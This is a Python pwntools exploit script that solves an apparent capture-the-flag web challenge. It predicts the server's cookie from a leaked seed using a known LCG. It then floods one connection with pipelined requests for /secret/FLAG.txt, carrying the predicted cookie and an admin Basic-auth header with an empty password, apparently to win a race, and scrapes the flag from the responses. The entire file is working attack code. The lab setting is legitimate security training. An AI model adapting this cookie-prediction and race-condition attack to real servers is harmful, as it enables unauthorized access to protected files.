#!/usr/bin/env python3
from pwn import remote, re, context
import time

context.log_level = "warn"

HOST, PORT = "up.zoolab.org", 10933

LCG_A = 6364136223846793005
LCG_C = 1
LCG_SHIFT = 33

def lcg_next(seed):
    return ((seed * LCG_A + LCG_C) & ((1 << 64) - 1)) >> LCG_SHIFT

def fetch_seed_and_expected_cookie(conn):
    request = (
        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
        b"Host: up\r\n\r\n"
    )
    conn.send(request)

    response = conn.recvuntil(b"\r\n\r\n", timeout=3)
    content_len = re.search(rb"Content-Length: (\d+)", response)
    if content_len:
        length = int(content_len.group(1))
        if length > 0:
            response += conn.recv(length, timeout=3)

    m = re.search(rb"Set-Cookie: challenge=(\d+);", response)
    if not m:
        return None
    seed = int(m.group(1))
    return lcg_next(seed)

def send_requests(conn, cookie_value, rounds=200):
    auth = b"Authorization: Basic YWRtaW46\r\n"
    req_template = (
        b"GET /secret/FLAG.txt HTTP/1.1\r\n"
        b"Host: up\r\n"
        b"Cookie: response=%d\r\n" % cookie_value
    ) + auth + b"\r\n"

    filler = b"GET /index.html HTTP/1.1\r\nHost: up\r\n\r\n"

    for _ in range(rounds):
        conn.send(filler)
        conn.send(req_template)

def collect_flag(conn, expected_responses):
    for _ in range(expected_responses):
        try:
            header = conn.recvuntil(b"\r\n\r\n", timeout=2)
            match = re.search(rb"Content-Length: (\d+)", header)
            if not match:
                continue
            length = int(match.group(1))
            body = conn.recv(length, timeout=2) if length > 0 else b""

            combined = header + body
            flag = re.search(rb"FLAG\{[^ \r\n\}]+\}", combined)
            if flag:
                return flag.group(0).decode()
        except:
            continue
    return None

def run_once():
    try:
        conn = remote(HOST, PORT, timeout=5)
        cookie = fetch_seed_and_expected_cookie(conn)
        if cookie is None:
            conn.close()
            return None

        send_requests(conn, cookie)
        flag = collect_flag(conn, 400)
        conn.close()
        return flag
    except:
        return None

if __name__ == "__main__":
    for attempt in range(3):
        print(f"Attempt {attempt+1}...")
        flag = run_once()
        if flag:
            print(f"\n[+] Flag obtained: {flag}")
            break
        else:
            print("[-] No flag this time.")
            time.sleep(1)
    else:
        print("[-] All attempts failed.")
